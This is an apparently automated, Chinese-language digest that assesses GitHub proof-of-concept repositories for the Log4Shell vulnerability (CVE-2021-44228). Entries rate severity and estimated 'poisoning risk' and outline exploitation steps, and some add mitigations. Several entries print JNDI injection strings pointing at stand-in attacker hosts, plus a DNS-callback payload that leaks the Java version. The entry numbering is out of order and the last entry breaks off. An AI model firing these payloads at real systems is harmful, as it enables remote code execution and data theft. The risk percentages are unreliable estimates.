该漏洞利用代码存在一定的投毒风险。提供的`README.md`文件描述了利用过程，但其中包含的payload (Socket appender) 有可能被用于数据窃取。尽管主要目的是演示RCE，但通过`SerializedLayout`将日志事件发送到攻击者服务器，实际上意味着任何被记录的数据（包括潜在的敏感信息）都可能被泄露。因此，存在一定风险。

**风险评估依据：**
提供的POC专注于建立Socket连接并将序列化的数据发送到远程服务器，这意味着它可以用来构建一个后门，泄露信息或者植入更深层次的恶意代码。

**综上所述，虽然POC的目的是演示Log4Shell漏洞，但其中利用Socket appender 和 SerializedLayout的行为,存在潜在的投毒行为，因此投毒风险不容忽视。**

**项目地址:** [tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment](https://github.com/tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #38

**来源**: [CVE-2021-44228-thomaspatzke_Log4Pot.md](../2021/CVE-2021-44228-thomaspatzke_Log4Pot.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极其高危，可导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序必须使用受影响的 Log4j2 版本，且允许攻击者控制记录的日志消息或日志消息参数。JNDI lookup substitution 必须启用 (2.15.0 之前默认启用)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 允许在日志消息中使用 JNDI (Java Naming and Directory Interface) 查询。当 Log4j2 尝试解析包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的日志消息时，它会尝试通过 JNDI 从指定的 LDAP 服务器检索并执行恶意代码。

**有效性：**
根据漏洞库信息、搜索结果和漏洞利用的广泛性，此漏洞的 POC 代码非常有效。

**投毒风险：**
提供的“漏洞利用代码”仅仅是一个 GNU GPL 协议的 LICENSE 文件，本身不包含任何可执行的代码或恶意指令。因此，基于这份文件，投毒风险为 0%。

**利用方式：**
1.  **攻击者注入恶意 JNDI 字符串：** 攻击者需要在应用程序能够记录的任何输入点注入包含 JNDI 查找的恶意字符串。这可能包括 HTTP 请求头（例如 `User-Agent`、`X-Forwarded-For`）、POST 请求参数、WebSocket 消息等。
2.  **Log4j2 记录日志：** 当应用程序使用 Log4j2 记录包含恶意 JNDI 字符串的日志消息时，Log4j2 会尝试解析该字符串。
3.  **JNDI 查找：** Log4j2 会触发 JNDI 查找，尝试连接到攻击者控制的 LDAP 或其他 JNDI 相关服务器。
4.  **远程代码执行：** 攻击者的 JNDI 服务器会返回一个包含恶意 Java 类的响应。Log4j2 会加载并执行该 Java 类，导致远程代码执行。攻击者可以利用此漏洞在目标系统上执行任意命令。

**缓解措施：**
*   升级到 Log4j2 的修复版本（2.16.0 或更高版本，或者 2.12.2、2.12.3 或 2.3.1）。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups` 为 `true` 来禁用消息查找，或者删除 `JndiLookup` 类。

综上所述，CVE-2021-44228 是一个极其严重的安全漏洞，利用方式简单，影响范围广泛，需要立即进行修复。

**项目地址:** [thomaspatzke/Log4Pot](https://github.com/thomaspatzke/Log4Pot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #39

**来源**: [CVE-2021-44228-winnpixie_log4noshell.md](../2021/CVE-2021-44228-winnpixie_log4noshell.md)

## CVE-2021-44228 Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，且允许记录用户可控的数据。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的攻击者执行远程代码。攻击者可以通过将恶意 JNDI 注入字符串插入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析此字符串时，它会向攻击者控制的 LDAP 或其他 JNDI 端点发起请求，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的 POC 代码非常有效。大量的安全厂商和研究人员都确认了此漏洞的存在和可利用性。提供的“Log4NoShell”代码实际上是一个缓解工具，通过禁用 Log4j2 的 JNDI 查找来防止漏洞被利用。它本身不是exploit，而是防御手段。

**投毒风险：**

分析提供的缓解工具代码，该代码主要功能是通过Java Agent禁用Log4j的JNDI lookup功能，本身不存在恶意代码。但是，任何第三方提供的工具都存在潜在的投毒风险。代码中使用了 ASM 字节码操作库，有一定的复杂性，增加了审查的难度。 因此，尽管表面上是防御工具，仍然存在一定的风险，建议在使用前仔细审查代码。

 风险评估：5%。

**利用方式：**

1.  攻击者识别使用易受攻击的 Log4j2 版本的应用程序。
2.  攻击者将包含恶意 JNDI 注入字符串（例如 `${jndi:ldap://attacker.com/evil}`）的输入发送到应用程序，确保该输入会被 Log4j2 记录下来。输入的途径包括但不限于：HTTP头（User-Agent, X-Forwarded-For等），POST请求体，URL参数等
3.  Log4j2 尝试解析该字符串，并向攻击者控制的 LDAP 服务器发起请求。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而允许攻击者执行任意代码。

**项目地址:** [winnpixie/log4noshell](https://github.com/winnpixie/log4noshell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #40

**来源**: [CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md](../2021/CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许外部JNDI查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的严重远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能执行从 LDAP 服务器加载的任意代码。该漏洞利用 JNDI 注入，攻击者将包含恶意 JNDI 查找的字符串发送到应用程序，Log4j2 解析并执行该字符串，从而导致远程代码执行。

**有效性：**
提供的POC代码有效。它展示了如何使用 JNDI 注入漏洞利用 Log4j2。该代码提供了一个简单的 Spring Boot 应用程序，用于触发漏洞，并提供了一个利用有效载荷的示例。

**投毒风险：**
此仓库中作者隐藏投毒代码的风险较低。`README.md` 中提示的payload执行的是打开计算器程序的操作，虽然不是恶意操作，但仍需警惕。另外，`pom.xml` 文件声明依赖了 `log4j-api` 和 `log4j-core` 2.14.1版本，这是一个受漏洞影响的版本，为复现漏洞提供环境。`VulController.java` 中定义了触发漏洞的端点 `/vul`，并使用 `log.info` 记录请求参数。这个简单的应用程序本身不包含任何隐藏的恶意代码，仓库目的是复现CVE-2021-44228。 但无法完全排除作者添加了不易察觉的后门的可能。风险评估为 10%。

**利用方式：**
利用方式如下：
1.  攻击者找到一个使用了 Log4j2 且允许外部 JNDI 查找的应用程序。
2.  攻击者将一个包含恶意 JNDI 查找的字符串（例如 `${jndi:ldap://your_ip:port/xxx}`）注入到应用程序可以记录的任何输入字段（例如 HTTP Header、POST 参数等）。
3.  当 Log4j2 尝试记录该字符串时，它会解析 JNDI 查找，并尝试连接到攻击者控制的 LDAP 服务器。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**项目地址:** [x1ongsec/CVE-2021-44228-Log4j-JNDI](https://github.com/x1ongsec/CVE-2021-44228-Log4j-JNDI)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #41

**来源**: [CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md](../2021/CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过控制日志消息或日志消息参数，从 LDAP 服务器加载并执行任意代码。漏洞利用方式是向服务器发送包含特定格式的 JNDI 注入payload的请求，例如 `${jndi:ldap://malicious-server.com/exploit}`。如果 Log4j2 记录了该请求，它会尝试解析该字符串，从而触发 JNDI 查找并从恶意服务器下载和执行代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞被广泛利用，POC代码有效。Unit 42、NVD、CrowdStrike、Sysdig、Oracle 等多个安全机构都发布了关于该漏洞的分析和缓解措施，证明了其真实性和危害性。

**投毒风险：**
提供的代码仓库主要侧重于使用机器学习方法检测Log4Shell攻击，而非直接的漏洞利用。尽管仓库中包含用于训练模型的日志数据和Python脚本，这些组件本身不太可能直接包含投毒代码。

风险在于：
1.  **数据污染：** 训练数据中可能包含精心构造的、旨在降低检测模型准确性的恶意日志条目（例如，通过添加混淆或规避技术），占比约5%。
2.  **依赖项风险：** `requirements.txt` 中列出的某些依赖项可能存在安全漏洞，但这不是作者的有意投毒。

总体而言，此代码仓库的投毒风险较低，约5%。

**利用方式：**
1.  攻击者将恶意 JNDI 注入 payload 插入到应用程序的日志消息中，例如通过 HTTP 请求头、POST 数据或其他用户可控的输入。
2.  如果应用程序使用存在漏洞的 Log4j2 版本记录此消息，Log4j2 会尝试解析 JNDI 字符串。
3.  Log4j2 触发 JNDI 查找，连接到攻击者控制的 LDAP 或 RMI 服务器。
4.  恶意服务器返回一个包含 Java 类的响应，该类包含攻击者想要执行的恶意代码。
5.  Log4j2 加载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.0 或更高版本。
*   禁用 JNDI 查找。
*   配置防火墙规则以阻止出站 LDAP 和 RMI 连接。

**项目地址:** [yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-](https://github.com/yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---



---

## POC #16

**来源**: [CVE-2021-44228-Tai-e_CVE-2021-44228.md](../2021/CVE-2021-44228-Tai-e_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响的 Log4j2 版本，且允许JNDI 查找。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入执行任意代码。漏洞利用方式通常涉及在日志消息中插入包含恶意 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此消息时，它会尝试通过 LDAP 从攻击者控制的服务器检索并执行代码。\n\n提供的漏洞利用代码是一个使用 Tai-e 静态分析工具来检测 Log4Shell 漏洞及其触发路径的项目。该项目本身不包含恶意代码，其目的是帮助安全研究人员和开发人员识别和修复受此漏洞影响的应用程序。但是，任何下载和使用漏洞利用代码的行为都存在一定的风险，因为可能存在其他未知的安全问题或依赖项。该项目使用了gradlew脚本，理论上存在一定的投毒风险，可能在编译的时候执行恶意代码，但从代码内容来看，直接投毒的可能性较低。主要风险在于构建脚本依赖的第三方库可能被篡改，导致潜在的供应链攻击。

根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用非常有效，影响广泛。需要尽快修复。


**项目地址:** [Tai-e/CVE-2021-44228](https://github.com/Tai-e/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #17

**来源**: [CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md](../2021/CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许出站网络连接访问攻击者控制的 LDAP 或其他 JNDI 端点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过发送特制的日志消息，利用 JNDI 注入漏洞，从恶意 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的 POC 代码是有效的，它演示了如何利用此漏洞。它包含一个 Dockerfile，用于构建包含漏洞的 Tomcat 应用，以及一个 Python 脚本，用于自动化漏洞利用过程，包括设置恶意的 LDAP 服务器和 HTTP 服务器，并生成 Payload。

**投毒风险：**
尽管该存储库旨在作为概念验证，但仍存在一定的投毒风险。 虽然代码本身没有明显的恶意功能，但它简化了漏洞利用，这可能会增加被不道德行为者利用的风险。`poc.py` 脚本中的部分代码存在可疑行为，比如 Java 代码的字符串拼接，以及 `Proc` 类的调用，这些地方有可能隐藏恶意指令。 因此，投毒风险评估为 10%。使用此 PoC 时应采取预防措施，例如在隔离环境中进行。

**利用方式：**
1.  攻击者发送包含 JNDI 查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的特制日志消息。该字符串会被 Log4j2 解析。
2.  Log4j2 尝试通过 JNDI 连接到攻击者控制的 LDAP 服务器。
3.  LDAP 服务器响应，并返回一个 Java 类的 URL。
4.  Log4j2 下载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

该 POC 仓库提供了一个 Dockerfile 用来构建一个有漏洞的web应用，以及一个 Python 脚本，它模拟了攻击者的 LDAP 服务器和 Payload 生成器，并自动化了利用过程。攻击者需要监听一个端口来接受反向shell连接。 使用方法是在目标服务存在漏洞的地方插入恶意的 JNDI 字符串。

**项目地址:** [YangHyperData/LOGJ4_PocShell_CVE-2021-44228](https://github.com/YangHyperData/LOGJ4_PocShell_CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #18

**来源**: [CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md](../2021/CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标应用程序使用受影响的Log4j2版本，并且允许消息查找替换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意的 JNDI 查找字符串注入到 Log4j2 可以记录的任何输入中来利用此漏洞。当 Log4j2 尝试解析并执行该 JNDI 查找时，它可能会从攻击者控制的 LDAP 或其他 JNDI 相关端点加载任意代码。

**有效性：**
提供的 PoC 代码是有效的。它使用 `${jndi:dns://${sys:java.version}.z72ouf.dnslog.cn}` 格式的 JNDI 注入，该注入会触发 DNS 查询到 `z72ouf.dnslog.cn`，从而验证漏洞是否已成功利用。 `${sys:java.version}` 获取Java版本号。

**投毒风险：**
此仓库中不太可能存在作者隐藏的投毒代码（0%）。提供的文件看起来直接针对演示和利用 CVE-2021-44228 漏洞。 `pom.xml` 文件定义了 log4j-core 和 log4j-api 的依赖项。`log4j2.xml` 文件配置了基本的日志记录。 `CVE202144228.java` 文件包含利用该漏洞的有效负载，该负载会生成 DNS 查询以进行验证。 由于该PoC的主要作用是为了验证漏洞，而非植入后门，因此认为投毒风险低。

**利用方式：**
1.  攻击者找到应用程序中记录用户可控输入的位置。 这些位置可能包括 HTTP header，POST 数据，GET 参数等，总之，所有程序日志可以记录的地方。
2.  攻击者将恶意 JNDI 查找字符串（例如`${jndi:ldap://attacker.com/Exploit}`）注入到此输入中。
3.  当应用程序记录此输入时，Log4j2 会尝试解析 JNDI 查找。
4.  Log4j2 会连接到攻击者控制的 LDAP 服务器（或其他的 JNDI 服务）。
5.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
6.  Log4j2 加载并执行此恶意 Java 类，从而允许攻击者在目标系统上执行任意代码。
7. 缓解措施包括升级 Log4j2 到 >=2.17.0 版本，禁用 JNDI 查找，或设置 `log4j2.formatMsgNoLookups=true`。


**项目地址:** [ZacharyZcR/CVE-2021-44228](https://github.com/ZacharyZcR/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #19

**来源**: [CVE-2021-44228-arabindadora_log4shell.md](../2021/CVE-2021-44228-arabindadora_log4shell.md)

## CVE-2021-44228 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j版本，并且允许记录用户可控的输入，同时启用消息查找替换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个存在于Apache Log4j2中的严重漏洞。该漏洞允许攻击者通过向日志消息或日志消息参数中注入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/a}`，来执行任意代码。当Log4j2处理包含该字符串的日志消息时，它会尝试通过JNDI从攻击者控制的LDAP服务器检索Java对象。如果JVM配置允许，该对象将被反序列化并执行，从而导致远程代码执行。

**利用方式：**
1.  攻击者识别使用Log4j2且记录用户可控输入的应用程序。
2.  攻击者构造包含恶意JNDI查找的payload，并将其注入到应用程序可以记录的任何输入字段中（例如，HTTP头、表单参数等）。
3.  当应用程序记录包含恶意payload的输入时，Log4j2会尝试解析JNDI查找。
4.  Log4j2向攻击者控制的LDAP服务器发出请求。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的引用。
6.  应用程序下载并执行恶意Java类，从而允许攻击者在目标系统上执行任意代码。

**评估POC代码：**
提供的PoC代码包含一个Dockerfile和Makefile，用于演示和利用CVE-2021-44228漏洞。Makefile包含用于构建Docker容器、启动/停止应用程序、触发漏洞利用和修补受害者应用程序的命令。`make exploit` 命令使用curl发送一个包含恶意JNDI payload的HTTP请求，该payload的目标是`${jndi:ldap://$(LHOST):$(LPORT)/a}`。该代码有效演示了漏洞利用。

**投毒风险：**
虽然PoC代码本身旨在演示和利用该漏洞，但任何从不受信任的来源下载的代码都存在潜在的风险。在本例中，投毒风险较低（约为10%），因为代码相对简单且易于审查。需要注意的是，Makefile的`exploit`命令和docker-compose.yml 中涉及的镜像如果被篡改，可能会引入恶意行为。用户应仔细检查所有代码，尤其是与网络连接和代码执行相关的部分，然后再执行PoC。代码中提供的Exploit.class ，本身就是一个后门代码,务必不要把POC验证的后门代码判定为投毒代码。docker-compose.yml 中涉及的镜像需要人工review.

**项目地址:** [arabindadora/log4shell](https://github.com/arabindadora/log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #20

**来源**: [CVE-2021-44228-asd58584388_CVE-2021-44228.md](../2021/CVE-2021-44228-asd58584388_CVE-2021-44228.md)

## CVE-2021-44228 Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，允许记录用户可控的输入，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者通过发送包含特定格式的恶意字符串（例如`${jndi:ldap://attacker.com/exploit}`）到应用程序，如果应用程序使用Log4j2记录该字符串，则Log4j2会尝试通过JNDI从攻击者控制的LDAP服务器检索恶意代码，并执行该代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。大量报告表明该漏洞已被广泛利用。

**投毒风险：**
提供的漏洞利用代码存储库主要包含漏洞分析和利用说明，以及用于设置LDAP和HTTP服务器的示例。`README.md`详细解释了漏洞的利用过程，并提供了相关的图片说明。`LICENSE`文件表明作者声明了代码的版权和使用许可。`marshalsec`目录可能包含利用所需的工具或者payload。总体来看，该仓库主要目的是为了分析和演示该漏洞，而非恶意投毒。但由于代码包含执行恶意代码的步骤，因此存在一定风险。我判断投毒的可能性是10%。因为`marshalsec`工具本身具备一定的攻击性，如果用户不熟悉该工具，可能会被误导或者滥用。

**利用方式：**
1.  攻击者构造包含JNDI查找的恶意请求字符串，例如 `${jndi:ldap://evil.com/a}`。
2.  应用程序使用存在漏洞的Log4j2版本记录此字符串。
3.  Log4j2解析字符串，发起JNDI请求到攻击者控制的LDAP服务器 `evil.com`。
4.  LDAP服务器返回一个指向恶意Java类的URL。
5.  Log4j2加载并执行该恶意Java类，导致远程代码执行。
6.  攻击者可以在目标服务器上执行任意命令。

**项目地址:** [asd58584388/CVE-2021-44228](https://github.com/asd58584388/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #21

**来源**: [CVE-2021-44228-axisops_CVE-2021-44228.md](../2021/CVE-2021-44228-axisops_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许Log消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j 2 中的一个严重漏洞，它允许攻击者通过控制日志消息或日志消息参数来执行任意代码。漏洞原理是 Log4j 2 启用了 JNDI 功能，该功能允许从 LDAP 服务器等远程位置加载代码。攻击者可以构造包含 JNDI 查找的恶意日志消息，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j 2 记录此消息时，它会尝试从 attacker.com 加载并执行代码。

**利用方式：**

1.  攻击者向使用 Log4j2 的应用程序发送包含恶意 JNDI 查找的请求。这些请求可以通过多种方式发送，例如 HTTP 请求头、POST 请求参数、WebSocket 消息等，只要这些数据会被Log4j记录即可。
2.  应用程序使用 Log4j2 记录接收到的请求，包括恶意 JNDI 查找字符串。
3.  Log4j2 解析日志消息，识别 JNDI 查找字符串，并尝试通过 JNDI 连接到指定的 LDAP 服务器（`attacker.com`）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行恶意 Java 类，从而允许攻击者在服务器上执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的POC是有效的，并且已经在野外被广泛利用。

**投毒风险：**

提供的漏洞利用代码是一个缓解脚本，旨在移除 Log4j JAR 文件中易受攻击的 `JndiLookup` 类。虽然该脚本本身旨在缓解漏洞，但仍然存在一些投毒风险：

*   **依赖项：**  该脚本依赖于 `PyYAML` 和系统命令 `zip` 和 `zipinfo`。如果这些依赖项被篡改或存在漏洞，可能会导致脚本执行恶意代码。
*   **配置：**  该脚本使用 `config.yaml` 文件进行配置。如果攻击者可以修改此配置文件，他们可能会将脚本指向恶意位置或执行其他恶意操作。
*   **脚本逻辑：** 脚本尝试从指定目录查找并修改JAR文件。 存在一定风险，即如果脚本逻辑存在缺陷，脚本可能会意外删除或损坏重要的JAR文件，导致服务中断，但造成远程代码执行的可能性较小。 投毒风险预估为5%。

**项目地址:** [axisops/CVE-2021-44228](https://github.com/axisops/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #22

**来源**: [CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md](../2021/CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j2中的一个严重漏洞。该漏洞源于Log4j2的JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。攻击者可以通过控制日志消息或日志消息参数，利用message lookup substitution功能从LDAP服务器加载并执行任意代码，从而实现远程代码执行(RCE)。

**漏洞利用方式：**

1.  **构造恶意请求：** 攻击者构造包含JNDI查找表达式的恶意请求，例如`${jndi:ldap://attacker.com/evil}`。该表达式会被记录到日志中。
2.  **JNDI查找：** Log4j2解析日志消息时，会识别并执行JNDI查找表达式。
3.  **LDAP请求：** Log4j2向攻击者控制的LDAP服务器(attacker.com)发起LDAP请求。
4.  **恶意代码加载：** LDAP服务器响应一个包含恶意Java类的URL。
5.  **远程代码执行：** Log4j2从URL加载并执行恶意Java类，导致RCE。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞利用的POC代码是有效的。搜索引擎结果中多个条目（如CISA，Palo Alto Networks，Sysdig，Cloudflare, NVD等）都确认了该漏洞的存在以及公开的POC代码的存在。漏洞库信息也明确指出该漏洞可以被利用来执行任意代码。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议文本，是一个许可协议，不包含任何可执行的代码。因此，判断此仓库中不存在作者隐藏的投毒代码，风险为0%。 该协议只声明了软件的使用许可，无法直接用于漏洞利用或者进行恶意攻击，与Log4Shell漏洞本身没有直接关系。


**项目地址:** [b-abderrahmane/CVE-2021-44228-playground](https://github.com/b-abderrahmane/CVE-2021-44228-playground)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #23

**来源**: [CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md](../2021/CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2 并且启用了消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向Log4j2记录的日志消息中注入恶意的JNDI查找字符串来利用此漏洞。当Log4j2处理包含`\${jndi:}`语法的字符串时，它会尝试通过JNDI（Java Naming and Directory Interface）来解析该字符串。攻击者可以利用这一点，将JNDI指向恶意的LDAP或其他JNDI服务，从而使Log4j2从攻击者控制的服务器上加载并执行任意Java代码，导致远程代码执行(RCE)。

**有效性：**

根据漏洞库信息、搜索结果和提供的POC代码，可以确定该漏洞利用代码是有效的。搜索结果中多个链接（例如NVD, CISA, Unit 42, Cloudflare, Red Hat, Oracle, Microsoft, Sysdig, Picus Security, CrowdStrike）都表明CVE-2021-44228是一个被广泛利用的RCE漏洞。POC代码通过`logger.error("${jndi:ldap://127.0.0.1:1389/any}")`演示了如何触发JNDI查找，如果目标系统存在漏洞，则会尝试连接到指定的LDAP服务器，从而允许远程代码执行。

**投毒风险：**

提供的代码仓库主要包含一个简单的 Maven 项目，包括 `pom.xml` 和 `Main.java` 文件。

*   `pom.xml`: 定义了项目依赖，仅包含 `log4j-core`，版本为 `2.14.1`，这是一个受漏洞影响的版本。
*   `Main.java`: 包含一个简单的 Log4j2 日志记录器，它会记录一条包含 JNDI 注入payload的错误消息。

此仓库的投毒风险较低，约为 5%。主要原因是：

